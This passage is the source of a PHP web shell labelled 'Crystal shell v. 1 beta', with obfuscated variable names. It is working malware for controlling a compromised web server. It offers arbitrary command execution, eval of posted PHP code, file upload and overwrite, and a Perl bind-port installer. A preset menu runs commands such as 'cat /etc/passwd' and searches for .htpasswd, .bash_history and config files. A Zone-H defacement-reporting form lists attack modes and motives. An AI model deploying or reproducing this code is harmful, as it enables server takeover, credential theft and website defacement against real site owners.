sprintf('%1s%1s%1s', $spbaefbe['read'], $spbaefbe['write'], $spbaefbe['execute']); $sp676578 .= sprintf('%1s%1s%1s', $spa53dc9['read'], $spa53dc9['write'], $spa53dc9['execute']); return trim($sp676578); } if (isset($_POST['post']) and $_POST['post'] == 'yes' and @$sp275713['userfile'][name] !== '') { copy($sp275713['userfile']['tmp_name'], $sp275713['userfile']['name']); } if (isset($_POST['fileto']) || isset($_POST['filefrom'])) { $spabbf84 = implode('', file($_POST['filefrom'])); $sp694629 = fopen($_POST['fileto'], 'wb'); fputs($sp694629, $spabbf84); $sp3cfe9e = fclose($sp694629); if ($sp3cfe9e) { $sp92ea66 = filesize($_POST['fileto']) / 1024; $spc91e44 = sprintf('%.2f', $sp92ea66); print '<center><div id=logostrip>Download - OK. (' . $spc91e44 . '??)</div></center>'; } else { print '<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>'; } } if (isset($_POST['installbind'])) { if (is_dir($_POST['installpath']) == true) { chdir($_POST['installpath']); $_POST['installpath'] = 'temp.pl'; } $sp694629 = fopen($_POST['installpath'], 'w'); fwrite($sp694629, $spd2a1b6); fclose($sp694629); exec('perl ' . $_POST['installpath']); chdir($spa25e24); } @($spcc80af = stripslashes($_POST['editfile'])); if ($spcc80af) { $sp694629 = fopen($spcc80af, 'r'); $sp14cb07 = file($spcc80af); $sp5ecd68 = ''; $sp1c78b4 = ''; foreach ($sp14cb07 as $sp5ecd68) { $sp5ecd68 = str_replace('<', '&lt;', $sp5ecd68); $sp5ecd68 = str_replace('>', '&gt;', $sp5ecd68); $sp1c78b4 = $sp1c78b4 . $sp5ecd68; } echo "<center><div id=logostrip>Edit file: {$spcc80af} </div><form action=\"{$sp7e9961}\" method=\"POST\"><textarea name=content cols=100 rows=20>{$sp1c78b4}</textarea>\n<input type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">\n<input type=\"hidden\" name=\"savefile\" value=\"{$_POST['editfile']}\"><br>\n<input type=\"submit\" name=\"submit\" value=\"Save\" id=input></form></center>"; fclose($sp694629); } if (isset($_POST['savefile'])) { $sp694629 = fopen($_POST['savefile'], 'w'); $sp1c78b4 = stripslashes($sp1c78b4); fwrite($sp694629, $sp1c78b4); fclose($sp694629); echo '<center><div id=logostrip>saved -OK!</div></center>'; } if (isset($_POST['php'])) { echo "<center><div id=logostrip>eval code<br><form action=\"{$sp7e9961}\" method=\"POST\"><textarea name=phpcode cols=100 rows=20></textarea><br>\n<input type=\"submit\" name=\"submit\" value=\"Exec\" id=input></form></center></div>"; } if (isset($_POST['phpcode'])) { echo '<center><div id=logostrip>Results of PHP execution<br><br>'; @eval(stripslashes($_POST['phpcode'])); echo '</div></center>'; } if ($sp7bd36a) { if ($spae9b8a == 'winda') { ob_start(); execute($sp7bd36a); $sp753119 = ''; $sp753119 = ob_get_contents(); ob_end_clean(); } else { ob_start(); echo decode(execute($sp7bd36a)); $sp753119 = ''; $sp753119 = ob_get_contents(); ob_end_clean(); } if (trim($sp753119)) { echo "<center><div id=logostrip>Command: {$sp7bd36a}<br><textarea cols=100 rows=20>"; echo decode($sp753119); echo '</textarea></center></div>'; } } $sp662a5a = array(); $sp662a5a = array_merge($sp662a5a, glob('*')); $sp662a5a = array_merge($sp662a5a, glob('.*')); $sp662a5a = array_merge($sp662a5a, glob('*.*')); $sp662a5a = array_unique($sp662a5a); sort($sp662a5a); echo '<table><tr><td>Name</td><td><a title="Type of object">Type</a></td><td>Size</td><td>Last access</td><td>Last change</td><td>Perms</td><td><a title="If Yes, you have write permission">Write</a></td><td><a title="If Yes, you have read permission">Read</a></td></tr>'; foreach ($sp662a5a as $spbc6552) { if ($spbc6552 != '.' and $spbc6552 != '..') { if (is_dir($spbc6552) == true) { $sp999f8c = ''; $sp999f8c = $sp999f8c . "<tr><td>{$spbc6552}</td><td>" . filetype($spbc6552) . '</td><td></td><td>' . date('G:i j M Y', fileatime($spbc6552)) . '</td><td>' . date('G:i j M Y', filemtime($spbc6552)) . '</td><td>' . perms(fileperms($spbc6552)); if (is_writable($spbc6552) == true) { $sp999f8c = $sp999f8c . '<td>Yes</td>'; } else { $sp999f8c = $sp999f8c . '<td>No</td>'; } if (is_readable($spbc6552) == true) { $sp999f8c = $sp999f8c . '<td>Yes</td>'; } else { $sp999f8c = $sp999f8c . '<td>No</td>'; } $spd05dac = $spd05dac . $sp999f8c; } if (is_file($spbc6552) == true) { $spa3ecf0 = ''; $spa3ecf0 = $spa3ecf0 . "<tr><td><a onclick=tag('{$spbc6552}')>{$spbc6552}</a></td><td>" . filetype($spbc6552) . '</td><td>' . filesize($spbc6552) . '</td><td>' . date('G:i j M Y', fileatime($spbc6552)) . '</td><td>' . date('G:i j M Y', filemtime($spbc6552)) . '</td><td>' . perms(fileperms($spbc6552)); if (is_writable($spbc6552) == true) { $spa3ecf0 = $spa3ecf0 . '<td>Yes</td>'; } else { $spa3ecf0 = $spa3ecf0 . '<td>No</td>'; } if (is_readable($spbc6552) == true) { $spa3ecf0 = $spa3ecf0 . '<td>Yes</td></td></tr>'; } else { $spa3ecf0 = $spa3ecf0 . '<td>No</td></td></tr>'; } $sp9f4c7d = $sp9f4c7d . $spa3ecf0; } } } echo $spd05dac; echo $sp9f4c7d; echo '</table><br>'; echo "\n<form action=\"{$sp7e9961}\" method=\"POST\">\nCommand:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"{$sp7bd36a}\">\n\n\nDirectory:<INPUT type=\"text\" name=\"dir\" size=30 value=\""; echo getcwd(); echo '">
<INPUT type="submit" value="..Exec.."></form>'; if (ini_get('safe_mode') == 1) { echo '<br><font size="3"color="#cc0000"><b>SAFE MOD IS ON<br>
Including from here: ' . ini_get('safe_mode_include_dir') . '<br>Exec here: ' . ini_get('safe_mode_exec_dir') . '</b></font>'; } ?>


</td></tr></table></p></td></tr></table>
	</a><br><hr size="1" noshade><p align="right">
	<font face="Wingdings 3" size="5" color="#DCE7EF">&lt;</font><b><select name="act"><option value="ls">
	With selected:</option><option value="delete">Delete</option><option value="archive">
	Archive</option><option value="cut">Cut</option><option value="copy">Copy</option><option value="unselect">
	Unselect</option></select>&nbsp;<input type="submit" value="Confirm"></p></form></td></tr></table><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td width="100%" height="1" valign="top" colspan="2" bgcolor="#000000"><p align="center">
	<b>
	:: </b>
	<font face=Verdana size=-2><a href="?act=command">Executed command</a></font><b> ::</b></p></td></tr><tr><td width="50%" height="1" valign="top" bgcolor="#000000" style="color: #000000; border: 1px solid #000000"><center><b>
	<?
	echo "
<form action=\"$REQUEST_URI\" method=\"POST\">
Command:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\">";
?>
		<input type="submit" name="submit1" value="Command" style="border: 1px solid #000000"><font face="Wingdings 3" color="#DCE7EF" size="3">f</font></form><p>
	&nbsp;</p>
	</td>
	<td width="50%" height="1" valign="top" bgcolor="#000000" style="color: #000000"><center>
	<form action="?act=cmd" method="POST"><input type="hidden" name="act" value="cmd"><input type="hidden" name="d" value="c:/appserv/www/shells/">
		<font color="#DCE7EF">Select</font><font face="Wingdings 3" color="#DCE7EF" size="3">g</font><select name="cmd" size="1"><option value="ls -la">
		-----------------------------------------------------------</option>
		<option value="ls -la /var/lib/mysq">ls MySQL</option>
		<option value="which curl">cURL ?</option>
		<option value="which wget">Wget ?</option>
		<option value="which lynx">Lynx ?</option>
		<option value="which links">links ?</option>
		<option value="which fetch">fetch ?</option>
		<option value="which GET">GET ?</option>
		<option value="which per">Perl ?</option>
		<option value="gcc --help">C gcc Help ?</option>
		<option value="tar --help">tar Help ?</option>
		<option value="cat /etc/passwd">Get passwd !!!</option>
		<option value="cat /etc/hosts">Get hosts</option>
		<option value="perl --help">Perl Help ?</option>
		<option value="find / -type f -perm -04000 -ls">
		find all suid files</option><option value="find . -type f -perm -04000 -ls">
		find suid files in current dir</option><option value="find / -type f -perm -02000 -ls">
		find all sgid files</option><option value="find . -type f -perm -02000 -ls">
		find sgid files in current dir</option><option value="find / -type f -name config.inc.php">
		find config.inc.php files</option><option value="find / -type f -name &quot;config*&quot;">
		find config* files</option><option value="find . -type f -name &quot;config*&quot;">
		find config* files in current dir</option><option value="find / -perm -2 -ls">
		find all writable directories and files</option><option value="find . -perm -2 -ls">
		find all writable directories and files in current dir</option><option value="find / -type f -name service.pwd">
		find all service.pwd files</option><option value="find . -type f -name service.pwd">
		find service.pwd files in current dir</option><option value="find / -type f -name .htpasswd">
		find all .htpasswd files</option><option value="find . -type f -name .htpasswd">
		find .htpasswd files in current dir</option><option value="find / -type f -name .bash_history">
		find all .bash_history files</option><option value="find . -type f -name .bash_history">
		find .bash_history files in current dir</option><option value="find / -type f -name .fetchmailrc">
		find all .fetchmailrc files</option><option value="find . -type f -name .fetchmailrc">
		find .fetchmailrc files in current dir</option><option value="lsattr -va">
		list file attributes on a Linux second extended file system</option><option value="netstat -an | grep -i listen">
		show opened ports</option></select><input type="hidden" name="cmd_txt" value="1">&nbsp;<input type="submit" name="submit" value="Execute" style="border: 1px solid #000000"></form></td></tr></TABLE><a bookmark="minipanel" href="?act=bind"><font face="Verdana" size="-2">Bind port to</font><font face="Webdings" size="5" color="#DCE7EF">آ</font></a><font color="#00FF00"><br>
</font>
<a bookmark="minipanel">
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr>
 <td width="50%" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><form method="POST">
	<p align="center">
<a bookmark="minipanel">
	<b><font face="verdana" color="red" size="4">
	<a style="font-weight: normal; font-family: verdana; text-decoration: none" bookmark="minipanel">
	<font face="verdana" size="2" color="#DCE7EF">::</font></a></font></b><a href="?act=edit" bookmark="minipanel"><span lang="en-us"><font face="Verdana" size="2">Edit/Create
	file</font></span></a><b><font face="verdana" color="red" size="4"><a style="font-weight: normal; font-family: verdana; text-decoration: none" bookmark="minipanel"><font face="verdana" size="2" color="#DCE7EF">::</font></a></font></b><font face="Wingdings 2" size="2">&quot;</font></p><p align="center">
	&nbsp;<?
if ($act == "edit") {echo "<center><b>التحرير والانشاء:<br><br> قم بوضع اسم الملف الذي تريد تحريره فقط<br>وبعد ذالك الضغط على config.php مثال<br>Edit<br>ستظهر لك نافذه بها محتويات الملف <br>وايضا ً اذا اردت انشاء ملف فقط ضع اسمه مع الامتداد <br>وبعد ذالك اكتب ماتريد washer-crystal.txt   </a>.</b>";}
?>
	</p>
	<p>&nbsp;</p>
	<p>	<?
	echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
File to edit:
<input type=\"text\" name=\"editfile\" >
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
<INPUT type=\"submit\" value=\"Edit\"></form></div>";
?>
	</p>
	</form></center></p></td>
 <td width="50%" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
                 <?
if ($act == "upload") {echo "<center><b>رفع الملفات:<br><br>قم بتحديد الملف المراد رفعه <br>وبعد ذالك قم بالضغط على الخيار الموضح<br>UPLOAD< </a>.</b>";}
?><a bookmark="minipanel"><b><font size="2">::
	</font>
	</b><a href="?act=upload"><span lang="en-us"><font face="Verdana" size="2">
					upload</font></span></a><b><font size="2">::</font></b><font face=Webdings size=2>&#325;</font><font size="2"></a></a></font><br><form method="POST" ENCTYPE="multipart/form-data"><input type="hidden" name="miniform" value="1"><input type="hidden" name="act" value="upload">&nbsp;
		<?
		echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<INPUT type=\"file\" name=\"userfile\">
<INPUT type=\"hidden\" name=\"post\" value=\"yes\">
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
<INPUT type=\"submit\" value=\"Download\"></form></div>";
?>
	<p></form></p></td>

</tr>
</table>	<b>
<font size=-2 face=verdana color="white">
                  <p>&nbsp;<a href="?act=Defacer">Defacer Zone-H</a></font><p align="center">&nbsp;
</p>
 					<?
if ($act == "Defacer") {echo "<center><b>CRYSTAL-H:<br><br>اسم المعلن Defacer<br>الموقع المخترق Victim<br>وضع الاختراق اي نوع الثغره التى استثمرتها Attack Mode <br> سبب الاختراق Attack Reason <br>لارسال الاختراق sand   <br> لرؤيه اخر التحذيرات المرسله بالموقع Attacks On Hold</a>.</b>";}
?>                 <p align="center"><font face="Verdana" color="#CC0000">
                  <SCRIPT language=JavaScript type=text/javascript>
        <!--
        function validate(){
            document.notifyForm.action = "http://www.zone-h.org/component/option,com_notify/Itemid,89/task,single/"
            document.notifyForm.submit();
        }
        //-->
        </SCRIPT>

                  Defacer </font></font></font>
<font face=Verdana color=#CC0000>
					Zone-h</font><FORM name=notifyForm
                  action=http://www.zone-h.org/component/option,com_notify/Itemid,89/task,single/
                  method=post>
                  <TABLE class=contentpane cellSpacing=0 cellPadding=0
                  width="100%" border=0>
                    <TBODY>
                    <!-- DESCRIPTION -->
                    <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                      <TD style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa"></TD></TR><!-- INSTRUCTIONS -->
                    </TBODY></TABLE>
                  <TABLE cellSpacing=0 cellPadding=10 width="100%" border=0 style="color: #CC0000; border: 1px outset #000000; background-color: #000000">
                    <TBODY>
                    <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                      <TD align=left style="color: #DCE7EF; border: 1px solid #FFFFFF; background-color: #000000" bgcolor="#000000" bordercolorlight="#000000" bordercolordark="#000000">
                        <TABLE width="100%" style="border: 1px outset #eeeeee; background-color: #EEEEEE">
                          <TBODY>
                          <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                            <TD style="border-left:1px solid #eeeeee; border-right:1px solid #aaaaaa; border-top:1px solid #eeeeee; border-bottom:1px solid #aaaaaa; BACKGROUND-COLOR: #000000"
                              align=left><SPAN
                              style="FONT-SIZE: 4px">&nbsp;</SPAN></TD></TR></TBODY></TABLE><!-- Input Form --><TABLE class=notifyForm width="100%">
                          <TBODY>
                          <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                            <TD noWrap align=left width="15%"
                              height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000"><b><font size="1" color="#FF0000">
							::Defacer::</font></b>:<font size=-2 face=verdana color=white><b><font face=Wingdings color=gray size="1">è</font></TD><TD noWrap align=left height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000">
							<INPUT
                              class=inputbox id=defacer style="WIDTH: 276px; color:#CC0000; background-color:#EEEEEE"
                              maxLength=64 name=defacer size="1" value="Super-Crystal"> </font></font>
							</font></TD>
							<font size=-2 face=verdana color=white>
                          <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                            <TD noWrap align=left height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000">
							<b><font size="1" color="#FF0000">::Victim::</font></b>:<font size=-2 face=verdana color=white><b><font face=Wingdings color=gray size="1">è</font></TD><TD noWrap align=left height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000">
							<INPUT
                              class=inputbox id=domain style="WIDTH: 276px; color:#CC0000; background-color:#EEEEEE"
                              maxLength=250 value=http://www.microsoft.com name=domain size="1"> </TD>
                          <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                            <TD noWrap align=left height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000">
							<b>
							<font color="#FF0000" size="1">Attack Mode</font></b>:<font size=-2 face=verdana color=white><b><font face=Wingdings color=gray size="1">è</font></TD><TD align=left height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000">
							<SELECT class=inputbox
                              style="WIDTH: 276px; color:#CC0000; background-color:#EEEEEE" name=method size="1"> <OPTION
                                value="" selected>choose</OPTION> <OPTION
                                value=23>Access credentials through Man In the
							Middle attack</OPTION><OPTION value=22>Attack
							against the administrator/user (password
							stealing/sniffing)</OPTION><OPTION value=29>DNS
							attack through cache poisoning</OPTION><OPTION
                                value=28>DNS attack through social engineering</OPTION><OPTION value=17>
							File Inclusion</OPTION><OPTION value=9>FTP Server
							intrusion</OPTION><OPTION value=8>Mail Server
							intrusion</OPTION><OPTION value=30>Not available</OPTION><OPTION value=14>
							Other Server intrusion</OPTION><OPTION value=18>
							Other Web Application bug</OPTION><OPTION value=19>
							Remote administrative panel access through
							bruteforcing</OPTION><OPTION value=20>Remote
							administrative panel access through password
							guessing</OPTION><OPTION value=21>Remote
							administrative panel access through social
							engineering</OPTION><OPTION value=25>Remote service
							password bruteforce</OPTION><OPTION
                                value=24>Remote service password guessing</OPTION><OPTION value=26>
							Rerouting after attacking the Firewall</OPTION><OPTION
                                value=27>Rerouting after attacking the Router</OPTION><OPTION value=12>
							RPC Server intrusion</OPTION><OPTION value=13>Shares
							misconfiguration</OPTION><OPTION value=15>SQL
							Injection</OPTION><OPTION value=10>SSH Server
							intrusion</OPTION><OPTION value=11>Telnet Server
							intrusion</OPTION><OPTION value=16>URL Poisoning</OPTION><OPTION value=7>
							Web Server external module intrusion</OPTION><OPTION
                                value=6>Web Server intrusion</OPTION></SELECT></TD></TR><TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                            <TD noWrap align=left height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000">
							<b>
							<font size="1" color="#FF0000">Attack Reason</font></b>:<font size=-2 face=verdana color=white><b><font face=Wingdings color=gray size="1">è</font></TD><TD align=left height=20 style="color: #000000; border: 1px solid #000000; background-color: #000000">
							<SELECT class=inputbox
                              style="WIDTH: 276px; color:#CC0000; background-color:#EEEEEE" name=reason size="1"> <OPTION
                                value="" selected>choose</OPTION> <OPTION
                                value=4>As a challenge</OPTION><OPTION
                                value=1>Heh...just for fun!</OPTION><OPTION
                                value=5>I just want to be the best defacer</OPTION><OPTION value=7>
							Not available</OPTION><OPTION
                                value=6>Patriotism</OPTION><OPTION
                                value=3>Political reasons</OPTION><OPTION
                                value=2>Revenge against that website</OPTION></SELECT></TD></TR></TBODY></TABLE><TABLE width="100%" style="border: 1px outset #eeeeee; background-color: #EEEEEE">
                          <TBODY>
                          <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                            <TD style="border-left:1px solid #eeeeee; border-right:1px solid #aaaaaa; border-top:1px solid #eeeeee; border-bottom:1px solid #aaaaaa; BACKGROUND-COLOR: #000000"
                              align=left><SPAN
                              style="FONT-SIZE: 4px">&nbsp;</SPAN></TD></TR></TBODY></TABLE><DIV style="CLEAR: both"></DIV>
                        <TABLE class=notifyForm width="100%">
                          <TBODY>
                          <TR style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa">
                            <TD align=left style="border-left: 1px solid #eeeeee; border-right: 1px solid #aaaaaa; border-top: 1px solid #eeeeee; border-bottom: 1px solid #aaaaaa" bgcolor="#000000">
							<INPUT class=button onclick=validate() type=button value=Send name=send style="color: #CC0000; border: 1px solid #C0C0C0; background-color: #EEEEEE">&nbsp;&nbsp;<b><font size=4 face="Wingdings 3">:</font></b>&nbsp;&nbsp;
							</font></font>
<font size=6 face=Webdings color="#FF0000">L </font><b>
							<a class="sublevel" href="http://www.zone-h.org/component/option,com_attacks/Itemid,45/">
							<font color="#FF0000">Attacks On Hold</font></a></b><font color="#FF0000">
							</font>
<font size=6 face=Webdings color="#FF0000">L</TD></TR></TBODY></TABLE><INPUT type=hidden
                        value=com_notify name=option style="font-family: Verdana; font-size: 10px; color: black; border: 2px solid black; background-color: #C0C0C0"></TR></TBODY></TABLE></FORM></font></b><br>
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
	<td width="990" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
	<b>
	&nbsp;</b><font face="Wingdings 3" size="5">y</font><b>Crystal shell v. 1 beta&nbsp; </b><font color="#CC0000"><b>©oded by</b> </font><b><a href="http://www.tryag.com">TrYaG Team</a> <span lang="en-us">l</span></b> <b><a href="?act=team">Arab Security Center Team</a> |<a href="http://www.secure4center.com"><font color="#DCE7EF">securityCenter</font></a>|
	: Web </b><font face="Wingdings 3" size="5">x</font></p><p align="center">&nbsp;</p></td></tr></table>

</a>


<div align="right">

<span lang="en-us">&nbsp; </span><TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD align=middle style="font-family: verdana, arial, 'ms sans serif', sans-serif; font-size: 11px; color: #D5ECF9">
      <TABLE class=calendar_table cellSpacing=1 cellPadding=1>
        <TBODY>
        <TR>
          <TD class=calendar_month colSpan=7><span lang="en-us">CRYSTAL-<font color="#CC0000">H</font></span><font color="#CC0000">
			2006</font></TD></TR><TR>
          <TD class=calendar_days>P</TD><TD class=calendar_days>P</TD><TD class=calendar_days>S</TD><TD class=calendar_days>C</TD><TD class=calendar_days>P</TD><TD class=calendar_days>C</TD><TD class=calendar_days>C</TD></TR><TR>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD></TR>
        <TR>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day>1 </TD></TR>
        <TR>
          <TD class=calendar_day>2 </TD>
          <TD class=calendar_day>3 </TD>
          <TD class=calendar_day><font color="#FF0000">4 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">5 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">6 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">7 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">8 </font> </TD></TR>
        <TR>
          <TD class=calendar_day>9 </TD>
          <TD class=calendar_day><font color="#FF0000">10 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">11 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">12 </font> </TD>
          <TD class=calendar_day>13</TD><TD class=calendar_day>14 </TD>
          <TD class=calendar_day>15 </TD></TR>
        <TR>
          <TD class=calendar_day><font color="#FF0000">16 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">17 </font> </TD>
          <TD class=calendar_day><font color="#FF0000">18</font></TD><TD class=calendar_day>19</TD><TD class=calendar_day>20 </TD>
          <TD class=calendar_day>21 </TD>
          <TD class=calendar_current_day>22 </TD></TR>
        <TR>
          <TD class=calendar_day>23</TD><TD class=calendar_day>24</TD><TD class=calendar_day>25</TD><TD class=calendar_day>26</TD><TD class=calendar_day><font color="#FF0000">27</font></TD><TD class=calendar_day><font color="#FF0000">28</font></TD><TD class=calendar_day><font color="#FF0000">29</font></TD></TR><TR>
          <TD class=calendar_day>30</TD><TD class=calendar_day>31</TD><TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD>
          <TD class=calendar_day></TD></TR></TBODY></TABLE></TD></TR>
  </TBODY></TABLE>

        </div>


</body></html>
<?php 